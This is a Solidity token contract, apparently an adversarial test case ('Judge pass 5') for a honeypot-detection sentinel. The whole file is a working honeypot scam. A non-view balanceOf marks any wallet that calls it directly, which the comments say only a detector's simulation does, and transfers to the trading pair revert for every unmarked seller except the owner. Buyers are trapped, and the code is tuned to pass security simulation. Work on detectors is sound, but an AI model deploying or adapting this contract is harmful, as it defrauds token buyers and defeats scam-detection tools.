// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// Judge pass 5. A honeypot that tells the sentinel's simulation from a real trade without reading
/// gas, fees, amounts or approves: the simulation sends `balanceOf(buyer)` as a top-level transaction
/// from the buyer (msg.sender == tx.origin) before its buy; a real buy or sale never does (router and
/// pair read balances by STATICCALL, msg.sender is a contract). Such a call marks its sender, and only
/// marked addresses can sell. In reality nobody is marked: every sale but the owner's reverts.
contract JudgeTrap {
    string public name = "Judge Side Channel";
    string public symbol = "JSC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public immutable owner;
    address public pair;
    mapping(address => uint256) internal bal;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public marked;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000 ether;
        bal[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address p) external {
        require(msg.sender == owner, "owner");
        pair = p;
    }

    /// Not `view`: a top-level call by an EOA (only a simulation does that) marks it. Under the
    /// router's or the pair's STATICCALL the branch is never taken, so nothing is written.
    function balanceOf(address a) external returns (uint256) {
        if (msg.sender == tx.origin && msg.sender != owner) marked[msg.sender] = true;
        return bal[a];
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _move(address from, address to, uint256 value) internal {
        require(bal[from] >= value, "balance");
        if (pair != address(0) && to == pair && from != owner && !marked[from]) revert("sale closed");
        bal[from] -= value;
        bal[to] += value;
        emit Transfer(from, to, value);
    }
}
